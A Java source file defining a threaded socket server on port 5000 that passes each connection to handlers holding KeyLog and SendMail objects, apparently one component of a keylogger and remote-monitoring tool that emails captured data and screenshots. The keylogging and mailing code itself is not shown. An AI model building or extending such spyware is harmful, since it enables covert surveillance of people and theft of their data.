package email;

import java.net.ServerSocket;
import java.net.Socket;

import javax.swing.ImageIcon;

public class ServerThreading extends Thread {
  
  public static String statusRunning = "nothing is running!";
  public static String status = "";
  public static String fileDemo = "";
  public static ImageIcon screenshotDemo;

  public KeyLog keylog;
  SendMail send;

  public ServerThreading(KeyLog keyLog, SendMail send) {
    this.keylog = keyLog;
    this.send = send;
  }

  public void run() {
    try {
      ServerSocket serverSocket = new ServerSocket(5000);
      System.out.println("Server is running...");
      boolean stop = false;
      while (!stop) {
        Socket socket = serverSocket.accept();
        ServerProcess clientSocket = new ServerProcess(
          socket,
          keylog,
          send
        );
        clientSocket.start();
      }
      serverSocket.close();
    } catch (Exception e) {
      System.out.println(e);
    }
  }
}